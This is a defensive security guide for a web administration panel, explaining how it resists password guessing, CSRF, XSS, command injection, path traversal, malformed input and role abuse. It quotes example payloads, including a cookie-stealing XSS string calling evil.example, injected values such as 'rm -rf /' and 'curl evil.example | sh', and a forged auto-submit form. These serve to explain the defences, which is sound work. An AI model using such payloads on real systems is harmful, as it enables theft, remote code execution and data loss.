# Web Attacks and How the Panel Stops Them

**In one sentence:** most attacks on a web panel either guess a password, trick a signed-in browser into acting, or
smuggle instructions inside ordinary input; the panel has a specific defence for each.

---

## Contents

1. [Guessing passwords](#1-guessing-passwords)
2. [Forged requests (CSRF)](#2-forged-requests-csrf)
3. [Injected scripts (XSS)](#3-injected-scripts-xss)
4. [Command and option injection](#4-command-and-option-injection)
5. [Path tricks](#5-path-tricks)
6. [Oversized or malformed input](#6-oversized-or-malformed-input)
7. [Doing more than one's role allows](#7-doing-more-than-ones-role-allows)
8. [Summary](#8-summary)

Each section shows what an attack would look like against this panel, and what happens.

---

## 1. Guessing passwords

**The attack.** A program tries thousands of passwords for the address `admin@example.com`.

```
POST /api/v1/session {"username": "admin@example.com", "password": "123456"}      → 401 Wrong e-mail address or password.
POST /api/v1/session {"username": "admin@example.com", "password": "password"}    → 401
... 3 more ...
POST /api/v1/session {"username": "admin@example.com", "password": "admin2024"}   → 429 Too many failed attempts. Try again in 15 minutes.
```

**Defences.**

* After 5 failures for one account from one address (or 20 from one address), sign-in is refused for 15 minutes.
* An e-mail address counts as its account: trying the user name of the same account does not give 5 more tries.
* Every check takes about 0.1 s on purpose (scrypt), and takes the same time for unknown e-mail addresses and user
  names, so neither the message nor the timing reveals which accounts exist.
* Generated passwords are 24 random characters; chosen ones must be 12 to 128 characters and cannot contain a
  common password, a sequence such as `12345` or the person's own name
  ([Security: password rules](../SECURITY.md#password-rules)).
* Every failure is in the audit log with its address.

---

## 2. Forged requests (CSRF)

**The attack.** While an administrator is signed in to the panel, they visit a malicious page. That page silently
sends a request to the panel, hoping the browser attaches the administrator's cookie:

```html
<form action="https://<panel link>/api/v1/instances/sales-main/actions/delete" method="POST">
  <input name="confirm" value="sales-main">
</form>
<script>document.forms[0].submit()</script>
```

**What happens.** It fails four times over:

| Check | Why the forged request fails |
| :--- | :--- |
| `SameSite=Strict` cookie | The browser does not send the panel's cookie with a request started by another site. |
| Same-origin check | The `Origin` header names the malicious site, not the panel: refused with 403. |
| JSON only | A form sends `application/x-www-form-urlencoded`: refused with 415. |
| CSRF token | The request lacks the secret `X-CSRF-Token` header, which the malicious page cannot read: refused with 403. |

---

## 3. Injected scripts (XSS)

**The attack.** Someone pushes a commit whose message is a script, hoping the panel shows it as code:

```
git commit -m '<img src=x onerror="fetch(`https://evil.example/?c=`+document.cookie)">'
```

**What happens.**

* The web app (React) inserts every value as **text**, never as HTML: the message is displayed literally, as the
  characters `<img src=x ...>`, not as an image.
* Even if something slipped through, the **Content-Security-Policy** forbids inline scripts and event handlers
  (`onerror=`) and any connection to other sites.
* The session cookie is `HttpOnly`: scripts cannot read it at all.

---

## 4. Command and option injection

**The attack.** The panel runs `git` and `docker`. An attacker types input that, pasted into a command line, would
run something else:

| Field | Input | Intended effect |
| :--- | :--- | :--- |
| Branch | `main; rm -rf /` | Run a second command |
| Branch | `--upload-pack=touch /tmp/pwned` | Make git run a program, by looking like an option |
| Modules to upgrade | `sale && curl evil.example \| sh` | Run a downloaded script |

**What happens.**

* Every value is checked first: branch names must start with a letter, digit or underscore and contain only
  letters, digits and `. _ / -` (no spaces, `;`, `&`, `|`, `..`); module lists only `a-z 0-9 _` and commas. All three
  inputs above are refused with 400 and a message.
* Commands are never built as text for a shell. They are lists of separate arguments, so even a strange value would
  stay one harmless argument:

```python
["git", "clone", "-b", branch, "--", url, folder]     # what the panel runs
"git clone -b " + branch + " " + url                   # what it never does
```

* `--` before addresses tells git that nothing after it is an option.

---

## 5. Path tricks

**The attack.** Using `..` to reach files outside the intended folder:

```
POST /api/v1/instances/sales-main/actions/remove-submodule {"path": "../../manager"}
GET  /docs/../../manager/sudoo.db
```

**What happens.**

* Instance names must match `a-z 0-9 -` before any file is touched; folder names may not contain `..` or `//`.
* Documentation pages are looked up in a list made when the panel starts; a path that is not in the list is "not
  found", whatever it contains.

---

## 6. Oversized or malformed input

**The attack.** Sending huge bodies, wrong types or invisible characters to crash the panel or confuse it:

```json
{"name": "aaaa... (1 million characters)"}
{"instance": "yes please"}
{"branch": "main\u0000"}
[1, 2, 3]
```

**What happens.** Bodies over 64 KB are refused (413). Every field is checked for type (`true`/`false` for
switches, text for text), length, and control characters (NUL, line breaks). A JSON list where an object is expected
is refused. Each refusal is a 400 with a sentence saying what to send instead; the panel never crashes on input.

---

## 7. Doing more than one's role allows

**The attack.** A developer (a role that may update and restart instances, not delete them) opens the browser's
developer tools and calls the delete endpoint directly, because the menu item is hidden for them:

```
DELETE /api/v1/instances/sales-main {"confirm": "sales-main"}
→ 403 Your role cannot do this (delete instances). Please contact the administrator, Yousef M. Y. Al Sabbah.
```

**What happens.** Every endpoint and action checks a named permission on the server for every request; hiding
buttons is only for convenience. The refusal is written to the audit log. Answers sent to roles without the
"see Odoo passwords and ports" permission never contain them in the first place.

---

## 8. Summary

| Attack | Main defences |
| :--- | :--- |
| Guessing passwords | Lockout, slow hashes, strong passwords, audit log |
| Forged requests | `SameSite=Strict`, same-origin check, JSON only, CSRF token |
| Injected scripts | Escaping, Content-Security-Policy, `HttpOnly` cookie |
| Command injection | Allow-list checks, argument lists without a shell, `--` |
| Path tricks | Name patterns, no `..`, documentation from a fixed list |
| Malformed input | Size limit, type, length and character checks |
| Role abuse | Server-side role checks, audit log |

The rules are in one file, `sudoo/web/validation.py`, and described in [Security](../SECURITY.md#6-checking-every-input).
